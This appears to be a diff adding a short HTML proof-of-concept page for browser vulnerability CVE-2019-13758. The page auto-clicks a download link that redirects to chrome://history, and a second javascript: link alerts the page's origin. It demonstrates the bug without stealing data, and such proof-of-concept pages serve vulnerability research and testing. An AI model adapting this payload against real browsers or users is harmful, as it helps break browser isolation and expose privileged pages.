@@ -1,0 +1,12 @@
+<head>
+<title> CVE-2019-13758 </title>
+</head>
+
+<body>
+
+<a href="/location.php?url=chrome://history" download>Download</a>
+<script>
+document.querySelector("a").click();
+</script>
+<a href="javascript:alert('I am '+self.origin)">WhoAmI?</a>
+</body>
